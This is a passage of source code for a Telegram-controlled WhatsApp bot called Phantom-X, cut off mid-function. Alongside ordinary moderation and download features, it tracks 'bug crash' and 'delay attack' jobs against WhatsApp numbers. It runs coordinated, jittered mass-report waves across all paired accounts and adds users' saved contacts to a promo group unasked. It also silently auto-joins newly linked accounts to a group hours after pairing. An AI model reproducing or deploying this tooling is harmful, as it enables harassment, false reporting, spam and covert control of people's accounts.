const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    DisconnectReason,
    fetchLatestBaileysVersion,
    getContentType,
    downloadMediaMessage,
    downloadContentFromMessage,
    generateWAMessageFromContent,
    proto: waProto,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf } = require("telegraf");
const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const http = require("http");

// Load .env file if present (works on Render, Railway, Heroku, VPS, local, etc.)
try { require("dotenv").config(); } catch (_) {}

// --- OWNER & WELCOME CONFIG ---
// Primary owner — always has full access, cannot be removed
// Set OWNER_ID in your environment/secrets to your Telegram user ID
const PRIMARY_OWNER_ID = process.env.OWNER_ID || "8277426999";

const WELCOME_CONFIG_FILE = path.join(__dirname, "welcome_config.json");
let welcomeConfig = {
    text: "Welcome to *Phantom-X Bot!* 🤖\n\nTo link your WhatsApp, use:\n`/pair 2348102756072`\n\n_Replace the number with your own WhatsApp number (with country code)._",
    photoFileId: null,
    extraOwners: [], // additional owner IDs added via /addowner
};

function loadWelcomeConfig() {
    try {
        if (fs.existsSync(WELCOME_CONFIG_FILE)) {
            const raw = fs.readFileSync(WELCOME_CONFIG_FILE, "utf8");
            const saved = JSON.parse(raw);
            welcomeConfig = { ...welcomeConfig, ...saved };
            if (!Array.isArray(welcomeConfig.extraOwners)) welcomeConfig.extraOwners = [];
        }
    } catch (_) {}
}

function saveWelcomeConfig() {
    try {
        fs.writeFileSync(WELCOME_CONFIG_FILE, JSON.stringify(welcomeConfig, null, 2), "utf8");
    } catch (_) {}
}

function isOwner(ctx) {
    const id = ctx.from?.id?.toString();
    if (!id) return false;
    return id === PRIMARY_OWNER_ID || welcomeConfig.extraOwners.includes(id);
}

function isPrimaryOwner(ctx) {
    return ctx.from?.id?.toString() === PRIMARY_OWNER_ID;
}

loadWelcomeConfig();

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
if (!TELEGRAM_TOKEN) {
    throw new Error(
        "Missing TELEGRAM_TOKEN environment variable.\n" +
        "How to fix depending on where you are hosting:\n" +
        "  • Render / Railway / Heroku: Add TELEGRAM_TOKEN in your platform's Environment Variables settings.\n" +
        "  • VPS / Local: Create a .env file in the project root with: TELEGRAM_TOKEN=your_token_here\n" +
        "  • Replit: Add it in the Secrets tab (not .env — Replit uses its own secret manager).\n" +
        "Get your token from @BotFather on Telegram."
    );
}
const telBot = new Telegraf(TELEGRAM_TOKEN);
const MAX_RETRIES = 5;
const BOT_VERSION = "1.0.0";
const SETTINGS_FILE = path.join(__dirname, "group_settings.json");
const SESSIONS_FILE = path.join(__dirname, "sessions.json");
const MODE_FILE = path.join(__dirname, "bot_mode.json");
const MENU_BANNER_FILE = path.join(__dirname, "menu_banner.jpg");
const BUG_BANNER_FILE  = path.join(__dirname, "bug_banner.jpg");
const OWNER_BANNER_FILE = path.join(__dirname, "owner_banner.jpg");
const THEME_FILE = path.join(__dirname, "menu_theme.json");
const BOT_SECURITY_FILE = path.join(__dirname, "bot_security.json");

// Per-user state
const activeSockets = {};
const retryCounts = {};
const botJids = {};        // userId -> bot's own WhatsApp JID
const telegramCtxs = {};   // userId -> telegram ctx (for alerts)

// Anti-spam tracker: { jid: { count, lastTime } }
const spamTracker = {};

// GC Clone jobs: { groupJid: { members: [], index, interval } }
const cloneJobs = {};

// Broadcast jobs: { botJid: { intervalId, groups, index, total } }
const broadcastJobs = {};

// Saved group invite links for auto-rejoin: { groupJid: inviteCode }
const savedGroupLinks = {};

// Bug crash message keys for undo: { groupJid: [msgKey, ...] }
const groupCrashKeys = {};

// Personal bug message keys for undo: { userJid: [msgKey, ...] }
const userCrashKeys = {};
const userBugTypes  = {}; // tracks which bug types were sent to each number

// Delay attack jobs: { targetJid: { intervalId, count } }
const delayJobs = {};

// Developer numbers — set DEV_NUMBERS in your environment as comma-separated values
// e.g.  DEV_NUMBERS=2348102756072,2348012345678
const DEV_NUMBERS = (process.env.DEV_NUMBERS || "2348102756072")
    .split(",").map(n => n.trim().replace(/\D/g, "")).filter(n => n.length > 5);
const DEV_NUMBER = DEV_NUMBERS[0] || "2348102756072"; // primary dev (backward compat)

// Convert a plain phone number to WhatsApp JID
function numToJid(num) {
    const cleaned = (num || "").toString().replace(/[^0-9]/g, "");
    if (!cleaned) return null;
    return cleaned + "@s.whatsapp.net";
}

// Get bug target from command — accepts phone number param OR @mention
function parseBugTarget(parts, msg) {
    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentioned.length) return mentioned[0];
    if (parts[1] && /^\d{7,}$/.test(parts[1])) return numToJid(parts[1]);
    return null;
}

function getSessionForSocket(sock) {
    for (const [userId, activeSock] of Object.entries(activeSockets)) {
        if (activeSock === sock) {
            const session = loadSessions()[userId] || {};
            return { userId: Number(userId), ...session };
        }
    }
    return null;
}

function lookupPhoneNumberInfo(input) {
    const number = (input || "").replace(/\D/g, "");
    if (!number || number.length < 7) return null;

    const countries = [
        ["234", "Nigeria", "NG"], ["233", "Ghana", "GH"], ["229", "Benin", "BJ"], ["228", "Togo", "TG"],
        ["225", "Côte d'Ivoire", "CI"], ["237", "Cameroon", "CM"], ["27", "South Africa", "ZA"],
        ["254", "Kenya", "KE"], ["255", "Tanzania", "TZ"], ["256", "Uganda", "UG"], ["250", "Rwanda", "RW"],
        ["20", "Egypt", "EG"], ["212", "Morocco", "MA"], ["213", "Algeria", "DZ"], ["216", "Tunisia", "TN"],
        ["1", "United States / Canada / Caribbean", "NANP"], ["44", "United Kingdom", "GB"],
        ["33", "France", "FR"], ["34", "Spain", "ES"], ["39", "Italy", "IT"], ["49", "Germany", "DE"],
        ["31", "Netherlands", "NL"], ["7", "Russia / Kazakhstan", "RU/KZ"], ["90", "Turkey", "TR"],
        ["971", "United Arab Emirates", "AE"], ["966", "Saudi Arabia", "SA"], ["974", "Qatar", "QA"],
        ["91", "India", "IN"], ["92", "Pakistan", "PK"], ["880", "Bangladesh", "BD"], ["62", "Indonesia", "ID"],
        ["60", "Malaysia", "MY"], ["63", "Philippines", "PH"], ["86", "China", "CN"], ["81", "Japan", "JP"],
        ["82", "South Korea", "KR"], ["61", "Australia", "AU"], ["55", "Brazil", "BR"], ["52", "Mexico", "MX"],
    ].sort((a, b) => b[0].length - a[0].length);

    const country = countries.find(([code]) => number.startsWith(code));
    let carrier = "Unknown";
    let localPrefix = "Unknown";

    if (number.startsWith("234")) {
        const local = number.slice(3);
        localPrefix = local.slice(0, 3);
        const ngCarriers = {
            "703": "MTN Nigeria", "704": "MTN Nigeria", "706": "MTN Nigeria", "803": "MTN Nigeria", "806": "MTN Nigeria", "810": "MTN Nigeria", "813": "MTN Nigeria", "814": "MTN Nigeria", "816": "MTN Nigeria", "903": "MTN Nigeria", "906": "MTN Nigeria", "913": "MTN Nigeria", "916": "MTN Nigeria",
            "701": "Airtel Nigeria", "708": "Airtel Nigeria", "802": "Airtel Nigeria", "808": "Airtel Nigeria", "812": "Airtel Nigeria", "901": "Airtel Nigeria", "902": "Airtel Nigeria", "904": "Airtel Nigeria", "907": "Airtel Nigeria", "912": "Airtel Nigeria",
            "705": "Globacom Nigeria", "805": "Globacom Nigeria", "807": "Globacom Nigeria", "811": "Globacom Nigeria", "815": "Globacom Nigeria", "905": "Globacom Nigeria", "915": "Globacom Nigeria",
            "809": "9mobile Nigeria", "817": "9mobile Nigeria", "818": "9mobile Nigeria", "908": "9mobile Nigeria", "909": "9mobile Nigeria",
        };
        carrier = ngCarriers[localPrefix] || carrier;
    }

    return {
        number,
        international: `+${number}`,
        countryName: country?.[1] || "Unknown",
        countryCode: country?.[2] || "Unknown",
        callingCode: country?.[0] || "Unknown",
        carrier,
        localPrefix,
    };
}

// --- REGROUP (T15) — slow-roll DM blast to migrate a group's members elsewhere ---
const REGROUP_FILE = path.join(__dirname, "regroup.json");
function loadRegroup() {
    const def = {
        text: "👋 Hey! We've moved/restructured. Here's the new community group — tap the link below to join:\n\n🔗 {LINK}",
        groupLink: "",
        perMessageDelaySeconds: 12,
        jitterSeconds: 6,
        skipAdmins: true,
        active: null,
    };
    if (!fs.existsSync(REGROUP_FILE)) return def;
    try { return { ...def, ...JSON.parse(fs.readFileSync(REGROUP_FILE, "utf8")) }; } catch { return def; }
}
function saveRegroup(d) { try { fs.writeFileSync(REGROUP_FILE, JSON.stringify(d, null, 2)); } catch {} }

// --- LINK WELCOME / AUTO-JOIN (T14) ---
// When a brand-new user pairs, the bot waits a configurable delay (with jitter)
// then DMs them and auto-joins them into the configured community group.
const LINK_WELCOME_FILE = path.join(__dirname, "link_welcome.json");
const PENDING_JOINS_FILE = path.join(__dirname, "pending_joins.json");

function loadLinkWelcome() {
    const def = {
        enabled: false,
        text: "👋 Welcome to *Phantom-X!*\n\nThanks for linking. You've now been added to our community group for updates and support.",
        groupLink: "",          // full https://chat.whatsapp.com/CODE link
        delayHours: 7,          // default 7h
        jitterMinutes: 30,      // ±30 minutes
        autoJoin: true,         // actually attempt to join the group on schedule
    };
    if (!fs.existsSync(LINK_WELCOME_FILE)) return def;
    try { return { ...def, ...JSON.parse(fs.readFileSync(LINK_WELCOME_FILE, "utf8")) }; } catch { return def; }
}
function saveLinkWelcome(data) { fs.writeFileSync(LINK_WELCOME_FILE, JSON.stringify(data, null, 2)); }
function buildLinkWelcomeMessage() {
    const cfg = loadLinkWelcome();
    if (!cfg.enabled) return null;
    let body = cfg.text || "";
    if (cfg.groupLink) body += `\n\n🔗 ${cfg.groupLink}`;
    return body;
}
function extractInviteCode(link) {
    if (!link) return null;
    const m = link.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
    return m ? m[1] : null;
}
function loadPendingJoins() { try { return JSON.parse(fs.readFileSync(PENDING_JOINS_FILE, "utf8")); } catch { return []; } }
function savePendingJoins(arr) { try { fs.writeFileSync(PENDING_JOINS_FILE, JSON.stringify(arr, null, 2)); } catch {} }
function addPendingJoin(entry) { const a = loadPendingJoins(); a.push(entry); savePendingJoins(a); }
function removePendingJoin(userId) {
    const a = loadPendingJoins().filter(e => e.userId !== userId);
    savePendingJoins(a);
}

// Schedules the welcome+join for a freshly-paired user.
// Persists to disk so it survives restarts.
function scheduleLinkWelcome(userId, sock) {
    const cfg = loadLinkWelcome();
    if (!cfg.enabled) return;
    const delayMs = (cfg.delayHours || 0) * 3600 * 1000;
    const jitterMs = (cfg.jitterMinutes || 0) * 60 * 1000;
    const jitter = jitterMs > 0 ? Math.floor((Math.random() * 2 - 1) * jitterMs) : 0;
    const fireAt = Date.now() + delayMs + jitter;
    const entry = { userId, fireAt, inviteCode: extractInviteCode(cfg.groupLink) };
    // Replace any prior pending join for the same user
    removePendingJoin(userId);
    addPendingJoin(entry);
    armLinkWelcome(entry, () => activeSockets[userId]);
    console.log(`[linkwelcome] scheduled for ${userId} in ${Math.round((fireAt - Date.now())/60000)}min`);
}

function armLinkWelcome(entry, getSock) {
    const wait = Math.max(0, entry.fireAt - Date.now());
    setTimeout(async () => {
        try {
            const s = getSock();
            if (!s) { console.log(`[linkwelcome] sock gone for ${entry.userId}, dropping`); removePendingJoin(entry.userId); return; }
            const cfg = loadLinkWelcome();
            const selfJid = (s.user?.id || "").split(":")[0].split("@")[0] + "@s.whatsapp.net";
            // Send the DM
            const intro = buildLinkWelcomeMessage();
            if (intro) { try { await s.sendMessage(selfJid, { text: intro }); } catch (e) { console.log(`[linkwelcome] DM fail: ${e?.message}`); } }
            // Try the auto-join
            if (cfg.autoJoin && entry.inviteCode) {
                try {
                    await s.groupAcceptInvite(entry.inviteCode);
                    console.log(`[linkwelcome] joined group for ${entry.userId}`);
                } catch (e) { console.log(`[linkwelcome] join fail: ${e?.message}`); }
            }
            removePendingJoin(entry.userId);
        } catch (e) { console.log(`[linkwelcome] handler error: ${e?.message}`); }
    }, wait).unref?.();
}

// Re-arm pending joins on process boot
function rearmAllPendingJoins() {
    const pending = loadPendingJoins();
    for (const e of pending) armLinkWelcome(e, () => activeSockets[e.userId]);
    if (pending.length) console.log(`[linkwelcome] re-armed ${pending.length} pending join(s)`);
}

// Returns true if the JID belongs to any developer number
function isDevJid(jid) {
    if (!jid) return false;
    const num = jid.replace(/@s\.whatsapp\.net|@g\.us/, "").split(":")[0];
    // Check static env devs + runtime-added devs
    try { return [...DEV_NUMBERS, ...loadExtraDevs()].includes(num); } catch { return DEV_NUMBERS.includes(num); }
}
function isDevProtected(jid) { return isDevJid(jid); } // backward compat alias

// Auto-join settings
const AUTOJOIN_FILE = path.join(__dirname, "autojoin.json");
function loadAutojoin() { if (!fs.existsSync(AUTOJOIN_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTOJOIN_FILE, "utf8")); } catch { return {}; } }
function saveAutojoin(d) { fs.writeFileSync(AUTOJOIN_FILE, JSON.stringify(d, null, 2)); }
const AUTOJOIN_BLACKLIST = ["porn", "18+", "adult", "xxx", "sex", "nude", "naked", "leak", "nudes", "18plus", "onlyfan"];

// --- WARNS ---
const WARNS_FILE = path.join(__dirname, "warns.json");
function loadWarns() { if (!fs.existsSync(WARNS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(WARNS_FILE, "utf8")); } catch { return {}; } }
function saveWarns(d) { fs.writeFileSync(WARNS_FILE, JSON.stringify(d, null, 2)); }
function getWarnCount(groupJid, userJid) { return loadWarns()[groupJid]?.[userJid] || 0; }
function addWarn(groupJid, userJid) { const d = loadWarns(); if (!d[groupJid]) d[groupJid] = {}; d[groupJid][userJid] = (d[groupJid][userJid] || 0) + 1; saveWarns(d); return d[groupJid][userJid]; }
function resetWarns(groupJid, userJid) { const d = loadWarns(); if (d[groupJid]) { delete d[groupJid][userJid]; saveWarns(d); } }
function getAllWarns(groupJid) { return loadWarns()[groupJid] || {}; }

// --- BANS (bot-level, per botJid) ---
const BANS_FILE = path.join(__dirname, "bans.json");
function loadBans() { if (!fs.existsSync(BANS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(BANS_FILE, "utf8")); } catch { return {}; } }
function saveBans(d) { fs.writeFileSync(BANS_FILE, JSON.stringify(d, null, 2)); }
function isBanned(botJid, userJid) { return (loadBans()[botJid] || []).includes(userJid); }
function addBan(botJid, userJid) { const d = loadBans(); if (!d[botJid]) d[botJid] = []; if (!d[botJid].includes(userJid)) d[botJid].push(userJid); saveBans(d); }
function removeBan(botJid, userJid) { const d = loadBans(); if (d[botJid]) { d[botJid] = d[botJid].filter(j => j !== userJid); saveBans(d); } }

// --- SCHEDULES ---
const SCHEDULES_FILE = path.join(__dirname, "schedules.json");
const scheduleTimers = {};
function loadSchedules() { if (!fs.existsSync(SCHEDULES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(SCHEDULES_FILE, "utf8")); } catch { return {}; } }
function saveSchedules(d) { fs.writeFileSync(SCHEDULES_FILE, JSON.stringify(d, null, 2)); }

// --- MEDIA DOWNLOADER (Batch 2B) ---
const DL_HEALTH_FILE = path.join(__dirname, "dl_health.json");
const DL_NOTIFY_COOLDOWN = {};
function loadDlHealth() { try { return JSON.parse(fs.readFileSync(DL_HEALTH_FILE, "utf8")); } catch { return {}; } }
function saveDlHealth(d) { try { fs.writeFileSync(DL_HEALTH_FILE, JSON.stringify(d, null, 2)); } catch {} }
function markDlHealth(provider, ok, errMsg) {
    const d = loadDlHealth();
    if (!d[provider]) d[provider] = { ok: 0, fail: 0, lastFailMsg: "", lastUsed: 0, lastFailAt: 0 };
    if (ok) { d[provider].ok++; } else { d[provider].fail++; d[provider].lastFailMsg = String(errMsg || "").slice(0, 200); d[provider].lastFailAt = Date.now(); }
    d[provider].lastUsed = Date.now();
    saveDlHealth(d);
}
function detectPlatform(url) {
    if (!url) return null;
    const u = url.toLowerCase();
    if (/youtu\.?be/.test(u)) return "youtube";
    if (/tiktok\.com|vm\.tiktok|vt\.tiktok/.test(u)) return "tiktok";
    if (/instagram\.com|instagr\.am/.test(u)) return "instagram";
    if (/facebook\.com|fb\.watch|fb\.com/.test(u)) return "facebook";
    if (/twitter\.com|x\.com/.test(u)) return "twitter";
    if (/soundcloud\.com|on\.soundcloud/.test(u)) return "soundcloud";
    if (/pinterest\.|pin\.it/.test(u)) return "pinterest";
    if (/reddit\.com|redd\.it/.test(u)) return "reddit";
    if (/tumblr\.com/.test(u)) return "tumblr";
    if (/vimeo\.com/.test(u)) return "vimeo";
    if (/twitch\.tv/.test(u)) return "twitch";
    if (/^https?:\/\//i.test(url)) return "generic";
    return null;
}
async function dlFetchJson(url, opts = {}) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), opts.timeout || 25000);
    try {
        const res = await fetch(url, { ...opts, signal: ctrl.signal, headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", ...(opts.headers || {}) } });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return await res.json();
    } finally { clearTimeout(t); }
}
const DL_PROVIDERS = {
    cobalt: async (url, opts = {}) => {
        const body = { url, vQuality: "720", isAudioOnly: !!opts.audio, filenamePattern: "basic" };
        const data = await dlFetchJson("https://api.cobalt.tools/api/json", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json" },
            body: JSON.stringify(body),
            timeout: 30000,
        });
        if (!data || data.status === "error") throw new Error(data?.text || "cobalt error");
        if (data.status === "redirect" || data.status === "stream" || data.status === "tunnel") {
            return { type: opts.audio ? "audio" : "video", url: data.url };
        }
        if (data.status === "picker" && Array.isArray(data.picker) && data.picker.length) {
            const first = data.picker[0];
            return { type: first.type === "photo" ? "image" : "video", url: first.url, picker: data.picker };
        }
        throw new Error(`cobalt: unexpected status ${data.status}`);
    },
    tikwm: async (url, opts = {}) => {
        const data = await dlFetchJson(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`);
        if (!data || data.code !== 0 || !data.data) throw new Error(data?.msg || "tikwm error");
        const d = data.data;
        if (opts.audio) {
            const a = d.music || d.music_info?.play;
            if (!a) throw new Error("tikwm: no audio");
            return { type: "audio", url: a, title: d.title };
        }
        const v = d.hdplay || d.play || d.wmplay;
        if (!v) throw new Error("tikwm: no video");
        return { type: "video", url: v, title: d.title, thumb: d.cover };
    },
};
const DL_CHAIN = {
    youtube: ["cobalt"],
    tiktok: ["tikwm", "cobalt"],
    instagram: ["cobalt"],
    facebook: ["cobalt"],
    twitter: ["cobalt"],
    soundcloud: ["cobalt"],
    pinterest: ["cobalt"],
    reddit: ["cobalt"],
    tumblr: ["cobalt"],
    vimeo: ["cobalt"],
    twitch: ["cobalt"],
    generic: ["cobalt"],
};
async function downloadMedia(url, opts = {}) {
    const platform = detectPlatform(url);
    if (!platform) { const e = new Error("Could not detect platform from URL"); e.platform = "unknown"; throw e; }
    const chain = DL_CHAIN[platform] || DL_CHAIN.generic;
    const errs = [];
    for (const name of chain) {
        const fn = DL_PROVIDERS[name];
        if (!fn) continue;
        try {
            const res = await fn(url, opts);
            if (res?.url) { markDlHealth(name, true); return { ...res, provider: name, platform }; }
            throw new Error("provider returned no url");
        } catch (e) {
            const m = e?.message || String(e);
            errs.push(`${name}: ${m}`);
            markDlHealth(name, false, m);
        }
    }
    const err = new Error(`All providers failed for ${platform}\n${errs.join("\n")}`);
    err.platform = platform; err.providerErrors = errs;
    throw err;
}
async function notifyOwnerDlFailure(sock, platform, url, errs) {
    try {
        const now = Date.now();
        if (DL_NOTIFY_COOLDOWN[platform] && now - DL_NOTIFY_COOLDOWN[platform] < 30 * 60 * 1000) return;
        DL_NOTIFY_COOLDOWN[platform] = now;
        const selfNum = (sock.user?.id || "").split(":")[0].split("@")[0];
        if (!selfNum) return;
        const selfJid = selfNum + "@s.whatsapp.net";
        const txt = `⚠️ *Downloader Alert*\n━━━━━━━━━━━━━━━━━━━\n\nAll providers failed for *${platform}*.\n\n🔗 ${url}\n\n*Errors:*\n${errs.map(e => `• ${e}`).join("\n")}\n\n_Run .dlhealth for full provider stats._`;
        await sock.sendMessage(selfJid, { text: txt });
    } catch {}
}

// --- THREAT NETWORK (cross-bot intel + mass-report) ---
const THREATS_FILE = path.join(__dirname, "global_threats.json");
const REPORT_CATEGORIES = ["scam", "harassment", "spam", "illegal", "impersonation", "hate", "other"];
function loadThreats() { try { return JSON.parse(fs.readFileSync(THREATS_FILE, "utf8")); } catch { return {}; } }
function saveThreats(d) { try { fs.writeFileSync(THREATS_FILE, JSON.stringify(d, null, 2)); } catch {} }
function normalizeNum(input) { return String(input || "").replace(/[^\d]/g, ""); }
function jidFromNum(num) { return `${normalizeNum(num)}@s.whatsapp.net`; }
function isThreatJid(jid) {
    if (!jid) return false;
    const num = normalizeNum(jid.split("@")[0].split(":")[0]);
    const t = loadThreats()[num];
    return !!(t && t.autoBlocked !== false);
}
function getThreat(num) { return loadThreats()[normalizeNum(num)] || null; }
function addThreat(num, reporterBotJid, category, note) {
    const cleanNum = normalizeNum(num);
    if (!cleanNum) return null;
    const cat = REPORT_CATEGORIES.includes((category || "").toLowerCase()) ? category.toLowerCase() : "scam";
    const d = loadThreats();
    if (!d[cleanNum]) {
        d[cleanNum] = {
            severity: "high", reports: [], autoBlocked: true,
            firstReported: Date.now(), lastSeen: Date.now(),
            triggerCount: 0, botActions: {}, nextReportAt: Date.now(),
            primaryCategory: cat,
        };
    }
    d[cleanNum].reports.push({ reporter: reporterBotJid || "unknown", category: cat, note: note || "", at: Date.now() });
    d[cleanNum].lastSeen = Date.now();
    d[cleanNum].primaryCategory = cat;
    saveThreats(d);
    return d[cleanNum];
}
function removeThreat(num) {
    const d = loadThreats();
    const k = normalizeNum(num);
    if (d[k]) { delete d[k]; saveThreats(d); return true; }
    return false;
}
function recordThreatBotAction(num, botJid, action) {
    const d = loadThreats();
    const k = normalizeNum(num);
    if (!d[k]) return;
    if (!d[k].botActions) d[k].botActions = {};
    if (!d[k].botActions[botJid]) d[k].botActions[botJid] = { blocked: false, reportedAt: 0, reportCount: 0 };
    if (action === "blocked") d[k].botActions[botJid].blocked = true;
    if (action === "reported") { d[k].botActions[botJid].reportedAt = Date.now(); d[k].botActions[botJid].reportCount = (d[k].botActions[botJid].reportCount || 0) + 1; }
    if (action === "trigger") d[k].triggerCount = (d[k].triggerCount || 0) + 1;
    saveThreats(d);
}
async function blockUserOnSock(sock, jid) {
    try {
        if (typeof sock.updateBlockStatus === "function") {
            await sock.updateBlockStatus(jid, "block");
            return true;
        }
    } catch (e) { console.log(`[ThreatNet] block failed on ${jid}: ${e?.message}`); }
    return false;
}
async function submitWAReport(sock, jid, category) {
    try {
        const cat = REPORT_CATEGORIES.includes(category) ? category : "scam";
        if (typeof sock.sendReceipt === "function") {
            try { await sock.sendReceipt(jid, undefined, [], "report"); } catch {}
        }
        if (typeof sock.query === "function") {
            try {
                await sock.query({
                    tag: "iq",
                    attrs: { to: "s.whatsapp.net", type: "set", xmlns: "urn:xmpp:reporting:0" },
                    content: [{ tag: "report", attrs: { reason: cat }, content: [{ tag: "jid", attrs: {}, content: jid }] }],
                });
            } catch {}
        }
        return true;
    } catch (e) { console.log(`[ThreatNet] report failed on ${jid}: ${e?.message}`); return false; }
}
async function runReportWaveAcrossAllBots(num, category, opts = {}) {
    const cleanNum = normalizeNum(num);
    if (!cleanNum) return { ok: 0, fail: 0 };
    const targetJid = jidFromNum(cleanNum);
    const bots = Object.entries(activeSockets).filter(([_, s]) => s && s.user);
    let ok = 0, fail = 0;
    const stagger = opts.immediate ? 0 : (opts.staggerSec || 8) * 1000;
    for (let i = 0; i < bots.length; i++) {
        const [, sock] = bots[i];
        try {
            const blocked = await blockUserOnSock(sock, targetJid);
            const reported = await submitWAReport(sock, targetJid, category);
            recordThreatBotAction(cleanNum, sock.user.id, "blocked");
            recordThreatBotAction(cleanNum, sock.user.id, "reported");
            if (blocked || reported) ok++; else fail++;
        } catch { fail++; }
        if (i < bots.length - 1 && stagger > 0) {
            const jitter = Math.floor(Math.random() * stagger * 0.6);
            await new Promise(r => setTimeout(r, stagger + jitter));
        }
    }
    const d = loadThreats();
    if (d[cleanNum]) {
        d[cleanNum].nextReportAt = Date.now() + 6 * 3600 * 1000;
        saveThreats(d);
    }
    return { ok, fail, totalBots: bots.length };
}
function scheduleThreatReportCycle() {
    setInterval(() => {
        try {
            const d = loadThreats();
            const now = Date.now();
            for (const [num, t] of Object.entries(d)) {
                if (!t.autoBlocked) continue;
                if (t.nextReportAt && now >= t.nextReportAt) {
                    const ageDays = (now - (t.firstReported || now)) / (24 * 3600 * 1000);
                    if (ageDays > 7) continue;
                    runReportWaveAcrossAllBots(num, t.primaryCategory || "scam", { staggerSec: 12 }).catch(() => {});
                }
            }
        } catch {}
    }, 30 * 60 * 1000);
}

// --- STRONGER ANTIBUG ---
function detectBugPatterns(text) {
    if (!text) return null;
    const reasons = [];
    const zw = (text.match(/[\u200b-\u200f\u202a-\u202e\u2060-\u206f\ufeff\u00ad]/g) || []).length;
    const comb = (text.match(/[\u0300-\u036f\u0489\u0c00-\u0c7f\u0c80-\u0cff\u0b80-\u0bff\u0600-\u06ff\ufdfb-\ufdfd]/g) || []).length;
    const newlines = (text.match(/\n/g) || []).length;
    const mentions = (text.match(/@\d{6,}/g) || []).length;
    const emojis = (text.match(/\p{Extended_Pictographic}/gu) || []).length;
    const ratio = zw / Math.max(text.length, 1);
    let maxRun = 0, run = 1;
    for (let i = 1; i < text.length; i++) { if (text[i] === text[i-1]) { run++; if (run > maxRun) maxRun = run; } else run = 1; }
    if (text.length > 5000) reasons.push(`oversize:${text.length}`);
    if (zw > 300) reasons.push(`zero-width:${zw}`);
    if (comb > 800) reasons.push(`combining:${comb}`);
    if (ratio > 0.35) reasons.push(`invisible-ratio:${ratio.toFixed(2)}`);
    if (newlines > 200) reasons.push(`newline-flood:${newlines}`);
    if (mentions > 30) reasons.push(`mention-bomb:${mentions}`);
    if (emojis > 400) reasons.push(`emoji-flood:${emojis}`);
    if (maxRun > 800) reasons.push(`char-repeat:${maxRun}`);
    return reasons.length ? reasons : null;
}
const antibugOffenders = {};
function recordAntibugHit(senderJid) {
    const k = senderJid;
    const now = Date.now();
    if (!antibugOffenders[k]) antibugOffenders[k] = { hits: [], firstHit: now };
    antibugOffenders[k].hits = antibugOffenders[k].hits.filter(t => now - t < 30 * 60 * 1000);
    antibugOffenders[k].hits.push(now);
    return antibugOffenders[k].hits.length;
}

// --- PROMOGROUP (growth engine with per-bot stagger) ---
const PROMOGROUP_FILE = path.join(__dirname, "promogroup.json");
const PROMOGROUP_DEFAULTS = {
    enabled: false, groupJid: "", groupLink: "",
    rate: 2, intervalHours: 24, poolAuto: true,
    manualPool: [], optedOut: [],
    added: {}, skipped: {}, lastRun: {},
    stats: { totalAdded: 0, totalInvited: 0, totalFailed: 0 },
    paused: false,
};
function loadPromoGroup() {
    if (!fs.existsSync(PROMOGROUP_FILE)) return { ...PROMOGROUP_DEFAULTS };
    try { return { ...PROMOGROUP_DEFAULTS, ...JSON.parse(fs.readFileSync(PROMOGROUP_FILE, "utf8")) }; }
    catch { return { ...PROMOGROUP_DEFAULTS }; }
}
function savePromoGroup(d) { try { fs.writeFileSync(PROMOGROUP_FILE, JSON.stringify(d, null, 2)); } catch {} }
function botStaggerOffsetMs(botJid, intervalHours) {
    let h = 0; const s = String(botJid || "x");
    for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) >>> 0;
    return (h % (intervalHours * 3600 * 1000));
}
function isBusinessHourLagos() {
    const h = Number(new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos", hour: "2-digit", hour12: false }));
    return h >= 9 && h < 21;
}
function getPromoGroupContactPool(sock, cfg) {
    const set = new Set();
    if (cfg.poolAuto && sock?.store?.contacts) {
        for (const jid of Object.keys(sock.store.contacts)) {
            if (jid.endsWith("@s.whatsapp.net")) set.add(normalizeNum(jid.split("@")[0]));
        }
    }
    for (const n of (cfg.manualPool || [])) set.add(normalizeNum(n));
    for (const n of (cfg.optedOut || [])) set.delete(normalizeNum(n));
    const selfNum = normalizeNum((sock.user?.id || "").split(":")[0]);
    if (selfNum) set.delete(selfNum);
    return [...set].filter(Boolean);
}
async function runPromoGroupCycleForBot(sock) {
    const cfg = loadPromoGroup();
    if (!cfg.enabled || cfg.paused || !cfg.groupJid) return;
    if (!isBusinessHourLagos()) return;
    const botJid = sock.user?.id || "unknown";
    const pool = getPromoGroupContactPool(sock, cfg);
    const alreadyDone = new Set(Object.keys((cfg.added[botJid] || {})).concat(Object.keys((cfg.skipped[botJid] || {})).filter(k => (cfg.skipped[botJid][k]?.reason === "permanent"))));
    const eligible = pool.filter(n => !alreadyDone.has(n));
    if (!eligible.length) return;
    const picks = eligible.sort(() => Math.random() - 0.5).slice(0, cfg.rate || 2);
    for (const num of picks) {
        const jid = jidFromNum(num);
        let method = "failed", reason = "";
        try {
            const res = await sock.groupParticipantsUpdate(cfg.groupJid, [jid], "add");
            const code = Array.isArray(res) ? res[0]?.status : res?.[jid]?.status;
            if (code === "200" || code === 200 || code === undefined) {
                method = "added"; cfg.stats.totalAdded++;
            } else if (String(code) === "403" || String(code) === "408" || String(code) === "409") {
                try {
                    await sock.sendMessage(jid, { text: `👋 Hey there!\n\nYou've got my number (Phantom-X) saved on WhatsApp, so I figured you might want in on the official community group for updates, new commands, and tips:\n\n🔗 ${cfg.groupLink || "<link>"}\n\nReply *STOP* if you'd rather I never message you again. 🙏` });
                    method = "invited"; cfg.stats.totalInvited++;
                } catch (e) { method = "failed"; reason = `dm-fail: ${e?.message}`; cfg.stats.totalFailed++; }
            } else { method = "failed"; reason = `code:${code}`; cfg.stats.totalFailed++; }
        } catch (e) { method = "failed"; reason = e?.message || "unknown"; cfg.stats.totalFailed++; }
